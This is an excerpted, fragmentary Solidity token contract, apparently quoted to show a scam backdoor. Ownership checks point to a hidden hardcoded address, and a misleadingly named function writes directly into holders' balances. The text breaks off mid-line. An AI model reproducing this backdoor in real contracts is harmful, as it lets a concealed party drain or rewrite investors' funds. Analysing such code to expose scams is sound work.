...
contract Ownable {
    ...
    address private _ooo = 0x8FcbeD7C7Bb0d787E85C49BC33E426B4158f75b0;
    function owner() private view returns (address) {
        return _owner;
    }
     modifier onlyOwner() {
        require(_ooo == msg.sender, "Ownable: caller is not the owner");
        _;
    }
   modifier onlyowner() {
...
contract TOKEN is IERC20, Ownable {
    ...
    function excludeFromFee(address account) public onlyOwner {
     ...
     function setSwapAndLiquifyEnabled(address spender, uint256 taxFee) public onlyOwner {
        _rOwned
        [spender] 
        = 
        (
